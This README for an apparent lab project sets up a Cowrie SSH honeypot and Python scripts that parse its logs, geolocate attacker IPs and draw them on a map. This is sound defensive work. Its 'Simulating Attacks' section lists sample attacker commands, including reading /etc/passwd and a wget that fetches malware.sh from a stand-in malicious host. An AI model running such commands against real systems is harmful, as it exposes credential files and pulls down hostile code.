# Honeypot Attack Pattern Detection Project

## Overview

This project deploys [Cowrie](https://github.com/cowrie/cowrie), a highly configurable SSH/Telnet honeypot, to safely capture and analyze attack attempts. Python scripts then parse the resulting logs, geolocate attacker IPs, and visualize hostile activity on a world map.  
**Recommended Platform:** Kali Linux (or any modern Linux with Python 3).

---

## Project Structure

```
HoneyPot Server to Detect Attack Patterns/
│
├── assets/
│   └── demo.mp4
├── cowrie/                              # Cowrie honeypot installation
│   ├── cowrie-env/                      # Python virtual environment for Cowrie
│   ├── etc/
│   │   ├── cowrie.cfg                   # Main Cowrie configuration file
│   │   ├── userdb.txt                   # Cowrie userdb for fake credentials
│   └── var/
│       └── log/
│           └── cowrie/
│               ├── cowrie.log           # Cowrie main log (human-readable)
│               └── cowrie.json          # Cowrie JSON log (main data for analysis)
├── cowrie-analysis/                     # Analysis and reporting scripts
│   ├── requirements.txt                 # Python requirements for analysis scripts
│   ├── parse_logs.py                    # Parses Cowrie logs for IPs, commands, etc.
│   ├── geoip_report.py                  # Geolocates attacker IPs using GeoLite2-City.mmdb
│   ├── visualize_attack_map.py          # Generates attack_map.html from geolocated data
│   ├── GeoLite2-City.mmdb               # GeoIP database (download from MaxMind, place here)
│   ├── attacker_ips.txt                 # List of attacker IPs (generated)
│   ├── ip_to_commands.json              # IP → list of attempted commands (generated)
│   ├── attacker_ips_geo.json            # Geolocated IPs (generated)
│   └── attack_map.html                  # Visual map of attacker locations (generated)
├── .gitignore
├── GeoLite2-City-Download-Instructions.txt
├── List-of-Commands-for-Cowrie-honeypot.txt
├── Report.pdf
└── README.md
```

---

## Setup & Installation

### 1. System Dependencies

Install required system packages:

```bash
sudo apt update
sudo apt install git python3 python3-venv python3-pip libffi-dev libssl-dev build-essential libpython3-dev
```

---

### 2. Cowrie Honeypot Installation

```bash
cd ~
git clone https://github.com/cowrie/cowrie.git

cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install --upgrade -r requirements.txt
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```
# (Optional) Edit etc/cowrie.cfg for advanced configuration.

---

### 3. Configure Cowrie

#### a. Set the SSH Port (Optional)

By default, Cowrie listens on port 2222 (safe for non-root use).  
To change:

```bash
nano etc/cowrie.cfg
```
Look for:
```
[ssh]
#port = 2222
```
Uncomment and change the port if desired.

> **Do not use port 22 unless you stop your real SSH server and run Cowrie as root.**

#### b. Configure Logging (Optional)

Find `[output_jsonlog]` and `[output_textlog]` in `cowrie.cfg`.  
Change `logdir` to customize log output locations.

#### c. Set Up Fake Credentials (`userdb.txt`)

- By default, Cowrie uses built-in credentials if `userdb.txt` is missing.
- For custom fake logins, copy and edit the example:
  ```bash
  cp etc/userdb.example etc/userdb.txt
  nano etc/userdb.txt
  ```
  Add lines like:
  ```
  root:x:password
  admin:x:admin
  fakeuser:x:testpass
  *:x:*
  ```
  - `username:x:password`
  - `*:x:*` allows any username/password (use with caution for demos).
- **Restart Cowrie after changes:**
  ```bash
  bin/cowrie restart
  ```

---

### 4. Set Up `cowrie-analysis`

```bash
cd ..
mkdir cowrie-analysis
cd cowrie-analysis
python3 -m venv venv
source venv/bin/activate
cat > requirements.txt <<EOF
geoip2==4.8.0
folium==0.16.0
matplotlib==3.8.4
EOF
pip install -r requirements.txt
```

---

### 5. Download GeoLite2 Database

- Register and download the free [GeoLite2-City.mmdb](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data) from MaxMind.
- Place `GeoLite2-City.mmdb` in your `cowrie-analysis/` directory.

---

## Running the Honeypot

From the `cowrie/` directory, activate the environment, and start Cowrie:

```bash
cd ~/cowrie
source cowrie-env/bin/activate
bin/cowrie start
# To check status: `bin/cowrie status`
# To stop: `bin/cowrie stop`
```

Logs are written to `cowrie/var/log/cowrie/cowrie.json`.

---

## Simulating Attacks (Generating Data)

> **To generate meaningful log data for analysis, you must simulate attacks.**

1. Connect to your honeypot using SSH from the same or another machine:
```bash
ssh -p 2222 fakeuser@localhost
```
# Use a password from your userdb.txt (e.g., testpass)

2. Once you get the (fake) shell prompt, simulate attacker behavior by running commands such as:
```
uname -a
whoami
ls -la /
cat /etc/passwd
wget http://malicious.example.com/malware.sh
exit
```
3. Repeat from different usernames/IPs if you wish.
4. All activity will be logged in `cowrie.json`.

---

## Analyzing Attacks

### 1. Parse Logs

```bash
cd ~/cowrie-analysis
source venv/bin/activate
python parse_logs.py
```
# Outputs: attacker_ips.txt, ip_to_commands.json

### 2. Geolocate IPs

```bash
python geoip_report.py
```
# Outputs: attacker_ips_geo.json


### 3. Visualize Attacks

```bash
python visualize_attack_map.py
xdg-open attack_map.html
```
# Outputs: attack_map.html (open in browser)

---

## Output Files and Their Purpose

- **attacker_ips.txt**: List of all unique attacker IP addresses.
- **ip_to_commands.json**: Mapping of each IP to the list of commands they attempted.
- **attacker_ips_geo.json**: List of attacker IPs with geolocation data (country, city, lat/lon).
- **attack_map.html**: Interactive world map showing attacker locations—view in your browser!

---

## Lab Demo Tip

If you only attack your honeypot from localhost (127.0.0.1), the analysis scripts will not geolocate your IP or show it on the map. To see results:

- **Option 1:** Attack from another machine/VM with a public or LAN IP.

```bash
ssh -p 2222 fakeuser@<KALI_VM_IP>
```

- **Option 2:** For demo, edit a line in `cowrie.json`, replacing all `"src_ip": "127.0.0.1"` with a real public IP (e.g., `"8.8.8.8"` or `"1.1.1.1"`), then rerun the analysis scripts.

---

## Sample Workflow

```bash
# 1. Start honeypot (in ~/cowrie)
cd ~/cowrie
source cowrie-env/bin/activate
bin/cowrie start

# 2. Simulate attack (from another terminal or machine)
ssh -p 2222 fakeuser@localhost
# (run some commands)

# 3. Analyze logs (in ~/cowrie-analysis)
cd ~/cowrie-analysis
source venv/bin/activate
python parse_logs.py
python geoip_report.py
python visualize_attack_map.py

# 4. View attack_map.html in your browser
xdg-open attack_map.html  # (or open manually)
```

---

## Troubleshooting & Tips

- **Empty Map?**
  - No attacks have been simulated or recorded. Make sure to SSH into your honeypot and run some commands first.
- **No fake shell or instant login failure?**
  - Check your `userdb.txt` in `cowrie/etc/`. Add credentials as described above and restart Cowrie.
- **No IP geolocation?**
  - Only public (non-local) IPs are geolocated. Attacks from localhost/127.0.0.1 may not appear on the map.
  - Ensure `GeoLite2-City.mmdb` is present and valid.
- **Log file is empty?**
  - Make sure Cowrie is running and listening on your chosen port.
  - Check logs in `cowrie/var/log/cowrie/cowrie.log` for errors.

---

## Security Note

- **Run Cowrie in a lab or sandboxed environment.**
- **Do NOT expose Cowrie to production or sensitive infrastructure.**
- Cowrie is highly configurable—**review its documentation before deploying in any network.**

---

## Resources

- [Cowrie Documentation](https://cowrie.readthedocs.io/en/latest/)
- [Cowrie GitHub](https://github.com/cowrie/cowrie)
- [GeoLite2 Database](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data)
- [Folium Documentation](https://python-visualization.github.io/folium/)
